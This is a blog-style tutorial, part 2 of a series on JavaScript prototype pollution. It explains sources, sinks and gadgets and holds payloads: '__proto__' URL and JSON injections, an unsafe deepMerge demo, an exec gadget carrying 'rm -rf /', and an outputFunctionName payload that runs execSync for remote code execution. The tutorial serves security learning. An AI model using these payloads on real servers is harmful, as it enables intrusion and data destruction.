---
description: Part 2 of Prototype pollution
---

# Prototype Pollution - Part 2

Previously we went through how objects and prototype works in JavaScript and a high level overview on how an attacker can pollute the prototype of object in JavaScript.

## Brief Recap

<figure><img src="../.gitbook/assets/image (72).png" alt=""><figcaption><p>A typical Prototype Pollution attack type Credits: PortSwigger</p></figcaption></figure>

In order for prototype pollution vulnerability to work, the user controlled properties **must** be assigned to the object's **prototype** instead of the object itself. Hence polluting the prototype of the object. This can be done through functions like a recursive merge function.&#x20;

As I mentioned in Part 1, to successfully exploit prototype pollution, you need the following key components

* A source - Any **user input** that allows you to **poison** the prototypes with arbitrary properties.
* A sink - A JavaScript function or DOM element that **execute** arbitrary code.
* An exploitable gadget - A property that is passed into a sink without **proper filtering**.

I will be diving more in depth into these three key components

## Prototype pollution source

As mentioned, a prototype pollution source is any user input that enables a user to add arbitrary properties to prototype objects. These are some of the most common type of sources:

* URL query via a GET request&#x20;
* JSON-based input via a POST request
* Web messages

I will be going through URL query and JSON-based input.

### Prototype pollution via URL

One can poison the prototype via URL in such a manner:

```http
https://greenhat.com/?__proto__['evilProperty']=payload
```

We might think that the URL parser may interpret `__proto__` as an arbitrary string. But as we mentioned before, if we merge these keys and values into an existing object as properties.

{% code title="What we think might happen when we do a recursive merge" overflow="wrap" %}
```json
{
    currentProperty1: 'test',
    currentProperty2: 'test2',
    __proto__: {
        evilProperty: 'payload'
    }
}
```
{% endcode %}

{% code title="What actually happen" %}
```javascript
targetObject.__proto__.evilProperty = 'payload';
```
{% endcode %}

So, how did this happen? The JavaScript engine actually treat `__proto__` as a getter for the prototype. As a result, the `evilProperty` is assigned to the prototype rather than the target object itself. Now all objects that use the same prototype of the `targetObject` will inherit the `evilProperty`.&#x20;

### Prototype pollution via JSON input

User-controllable objects are often derived from a JSON string using the `JSON.parse()` method. `JSON.parse()` also treats any key in the JSON object as an arbitrary string, including things like `__proto__`.&#x20;

{% code title="A typical malicious JSON " %}
```json
{
    "__proto__": {
        "evilProperty": "payload"
    }
}
```
{% endcode %}

Using `JSON.parse()` method, if we convert the JSON object into a JavaScript object, the resulting object will have a property with the key `__proto__`. If this object is merged into an existing object without proper key sanitization, it will lead to prototype pollution.

## Prototype pollution sinks

A sink refers to a point in the code where untrusted input is processed or executed. This makes it a potential risk if it is not properly handled. In our case for a web application, it will usually be a JavaScript function or DOM element that allows for arbitrary JavaScript or system commands. This obviously depends on the type of web application and the dependency libraries that are in use.&#x20;

```javascript
function deepMerge(target, source) {
    for (let key in source) {
        if (typeof source[key] === 'object' && source[key] !== null) {
            if (!target[key]) target[key] = {};
            deepMerge(target[key], source[key]);
        } else {
            target[key] = source[key];  // 🚨 Prototype Pollution Sink
        }
    }
}

let maliciousPayload = JSON.parse('{ "__proto__": { "isAdmin": true } }');

deepMerge({}, maliciousPayload);

console.log({}.isAdmin); // ✅ True - Exploited!
```

## Prototype pollution gadgets

This is probably the most important part of prototype pollution as a gadget allows the vulnerability to become a viable exploit. Gadgets are usually existing function or a feature in the application that can be manipulated to trigger arbitrary execution or escalate privileges after polluting the prototype.

{% code title="A example of exec method being use as a gadget for prototype pollution" %}
```javascript
const { exec } = require("child_process");

let userInput = JSON.parse('{ "__proto__": { "shell": "rm -rf /" } }');

// Polluting the prototype
Object.assign({}, userInput);

exec(userInput.shell, (error, stdout, stderr) => {
    console.log(stdout);
});

```
{% endcode %}

A property can be used as a gadget if it is:

* Used by the application in an unsafe way such as passing it to a sink without proper filtering.
* The object must inherit a malicious version of the property added to the prototype by the attacker.

## A example of prototype pollution

Now for an specific example, I have a vulnerable function called `compile` and I control the `outputFunctionName` property of it.

{% code title="An example of compile function Credits: Offsec" %}
```javascript
569    compile: function () {
...
574      var opts = this.opts;
...
584      if (!this.source) {
585        this.generateSource();
586        prepended +=
587          '  var __output = "";\n' +
588          '  function __append(s) { if (s !== undefined && s !== null) __output += s }\n';
589        if (opts.outputFunctionName) {
590          prepended += '  var ' + opts.outputFunctionName + ' = __append;' + '\n';
591        }
...
609      }
```
{% endcode %}

Based on line 590, to make the payload work, we need to do the following:

```javascript
 var x = 1; WHATEVER_JSCODE_WE_WANT ; y = __append;'
```

We just need to add a `x=1; + our code; + y` to the payload to execute this part properly.

If we were to have a JSON input for a API call on a `/sample` endpoint, we can do the following to ensure that our code executes:

<pre class="language-json" data-title="A sample JSON input payload"><code class="lang-json"><strong>}
</strong><strong>    "sampleProperty": "",
</strong><strong>    "__proto__":
</strong>    {
        "outputFunctionName":   "x = 1; console.log(process.mainModule.require('child_process').execSync('whoami').toString()); y"
    }
}
</code></pre>

This web application will process our payload to execute the system `whoami` command on the server hence allowing us to get RCE via prototype pollution.&#x20;

**Author**

* Frost :snowflake:

**References**

* [https://portswigger.net/web-security/prototype-pollution](https://portswigger.net/web-security/prototype-pollution)
* Offsec Advanced Web Attack and Exploitation
